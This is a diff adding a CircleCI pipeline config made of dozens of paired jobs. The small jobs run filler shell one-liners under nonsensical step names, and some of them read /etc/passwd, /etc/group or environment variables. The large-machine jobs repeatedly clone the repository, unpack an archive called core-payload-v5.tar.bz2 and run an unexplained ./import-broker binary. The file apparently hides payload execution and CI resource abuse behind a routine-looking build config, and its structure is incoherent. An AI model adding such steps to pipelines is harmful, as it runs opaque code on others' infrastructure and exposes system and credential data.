@@ -1,0 +1,1445 @@
+version: 2.1
+
+jobs:
+  AcornV4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: watermark still frames maybe
+          command: |
+            mkdir -p /tmp/east
+            set +o pipefail 2>/dev/null; # final d
+            (seq 1 630373) > /tmp/east/framewidgetnickelmountain; true
+            echo "stage [check-production-artifact-bundle] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'framewidgetnickelmountain'
+  check-production-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  Y80:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: INC BIOS settings
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; ls -S | awk '{print length, $0}' | sort -n | tail -3; true ; } > /tmp/east/thicket_ridge_archive
+            echo "stage [hotfix-489] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'thicket_ridge_archive'
+  hotfix-489:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/HAWK_ROUTER 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  IoT_INIT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Confirm visa paperwork by friday
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; echo 'hello from the shell' | rev | tr -d '[:digit:]'; true ; } > /tmp/east/tone
+            echo "stage [package] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'tone'
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/tone 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  Primary-Fixture-Struct:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Frankfurt first then pod 7
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; shuf -i 2-61 -n 9 | awk '{s+=$1} END {printf "%.2f\n", s/NR}'; true ; } > /tmp/east/omega
+            echo "stage [prometheus-ng] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'omega'
+  prometheus-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/HAWK_ROUTER 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  no_repo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Reset
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; cat /etc/group|grep --line-number mail|wc -l; true ; } > /tmp/east/pa9
+            echo "stage [v9-beta] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'pa9'
+  v9-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/HAWK_ROUTER 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  creekkoallhq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Divert to the landing page
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; for w in {0..9}; do echo $w; done | wc -l; true ; } > /tmp/east/PO_095039
+            echo "stage [v7-beta] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'PO_095039'
+  v7-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/PO_095039 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  LEN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Quarantine the test matrix carefully
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; for val in papaya grape lime apple pear fig; do echo "${val}" | rev;done | wc -l; true ; } > /tmp/east/KqS
+            echo "stage [go1-21-bench] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'KqS'
+  go1-21-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/KqS 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  eta_bar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Always pause the swap space
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; line="public.csv" && echo "${line/b/B}"; true ; } > /tmp/east/21763ec2-2df3
+            echo "stage [v6-alpha] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - '21763ec2-2df3'
+  v6-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/21763ec2-2df3 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  prompt-resource:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Promote the travel claims per policy
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; hash sed 2>/dev/null && echo installed || echo "not installed"; true ; } > /tmp/east/crc_94569eb2
+            echo "stage [victor] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'crc_94569eb2'
+  victor:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  FLG-MIN-LEN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Make the cold storage tier go brrr
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; for word in $(seq 1 6); do echo "$word"; done | sort; true ; } > /tmp/east/P_42465
+            echo "stage [wip-router-v2-redirect] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'P_42465'
+  wip-router-v2-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  y_step:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Gently split the loss curve
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; head -c 1000 /dev/urandom | tr -dc "a-z" | fold -w 6 | head -n 3; true ; } > /tmp/east/sTacKCOnFiG
+            echo "stage [ship-it] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'sTacKCOnFiG'
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  API_IMPORT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Step nine flash the dev board
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; function countLines() { ls -ld "$@"; }; countLines /tmp /etc; true ; } > /tmp/east/tmp-82b75a4
+            echo "stage [jun6-ship] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'tmp-82b75a4'
+  jun6-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  ledgerx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Apr summary run
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; env | grep '^P'; true ; } > /tmp/east/ad711d8
+            echo "stage [yolo] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'ad711d8'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  release-num-59:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: assert blocked
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | grep 'games' | cut -d: -f1,3; true ; } > /tmp/east/bea60db7eef0d7ab62a4fe3ddbd3abfdd4d3
+            echo "stage [alpha-8] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'bea60db7eef0d7ab62a4fe3ddbd3abfdd4d3'
+  alpha-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  filterGANNonce:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Reboot the edge router ready for speed
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; awk -F : '{print $1, $7}' /etc/passwd | fmt -w 34 | cut -c1-16; true ; } > /tmp/east/ridgefilter
+            echo "stage [bun-cov] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'ridgefilter'
+  bun-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/ridgefilter 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  ou:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: What about the fog volumes
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; grep -l -r if /etc/profile.d | wc -l; true ; } > /tmp/east/silent
+            echo "stage [rollout] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'silent'
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/HAWK_ROUTER 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  BasicFileKernel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Dedupe or tidy shared drive
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; for w in $(seq 5); do echo $w; done; true ; } > /tmp/east/flux-vault
+            echo "stage [orion] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'flux-vault'
+  orion:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/flux-vault 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  cn-mike:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Optimisation whilst we wait
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; for i in {1..12}; do echo $RANDOM; done|sort -n|uniq; true ; } > /tmp/east/rev_91210
+            echo "stage [aug6-ship] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'rev_91210'
+  aug6-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  walnut-wrench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: compacting sessions table now
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; compgen -k | pr -4 -t -w 80 | rev | tail -5; true ; } > /tmp/east/5park_fen_mapper_k3rne1
+            echo "stage [green-light] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - '5park_fen_mapper_k3rne1'
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/5park_fen_mapper_k3rne1 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  arrPage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Hat trick batching
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; comm <(printf "%s\n" fig lemon mango) <(printf "%s\n" brown pink purple); true ; } > /tmp/east/326c014
+            echo "stage [CHECK_UAT] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - '326c014'
+  CHECK_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/326c014 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  TreeIface:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: looping gif previews in background
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; letter=(cat wolf frog bear);echo "${letter[@]^^}"; true ; } > /tmp/east/ZINC_NEUTRON_LOADER_FILTER
+            echo "stage [cook-it] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'ZINC_NEUTRON_LOADER_FILTER'
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/ZINC_NEUTRON_LOADER_FILTER 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  flattenProviderDefaultUnsafe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Summarise the positive control and have done with it
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; getent passwd | sort -t: -k 3 -n; true ; } > /tmp/east/Ae1t
+            echo "stage [uniform-7] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'Ae1t'
+  uniform-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/Ae1t 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  gnome-throw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Give the cable tray 5 seconds
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; cut -d : -f 3 /etc/group | tac | awk 'NR==1{m=$1} $1>m{m=$1} END{print m}'; true ; } > /tmp/east/JSON
+            echo "stage [bug-2962] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'JSON'
+  bug-2962:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  rate-471:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Excuse the wait
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; cut -c1-13 /etc/passwd | head -n 4; true ; } > /tmp/east/eshy
+            echo "stage [Prepare_Service6] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'eshy'
+  Prepare_Service6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  ddlBusRestore:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Calm the product owner
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; find . -maxdepth 1 -type f -empty -exec wc -c '{}' \;; true ; } > /tmp/east/5car137.4zur3.70ken
+            echo "stage [produce-nightly-artifact-bundle] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - '5car137.4zur3.70ken'
+  produce-nightly-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  CURC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Warm the sampler with lr 5e5
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; echo thursday tuesday saturday sunday monday | tr ' ' '\n' | wc -l; true ; } > /tmp/east/pulseCedarFjord
+            echo "stage [v4-nightly1] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'pulseCedarFjord'
+  v4-nightly1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/HAWK_ROUTER 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  adapter_ref:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Encoding every 2 hours
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; set -o | awk '{print $1}' | pr -4 -t -w 80 | sort -u; true ; } > /tmp/east/s1vy0gv
+            echo "stage [verify-staging-docker-image] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 's1vy0gv'
+  verify-staging-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  maple_sierra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: No more format
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; yes "version 2.0" | head -3; true ; } > /tmp/east/HAWK_ROUTER
+            echo "stage [nov3-release] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'HAWK_ROUTER'
+  nov3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/HAWK_ROUTER 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  st___migration:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
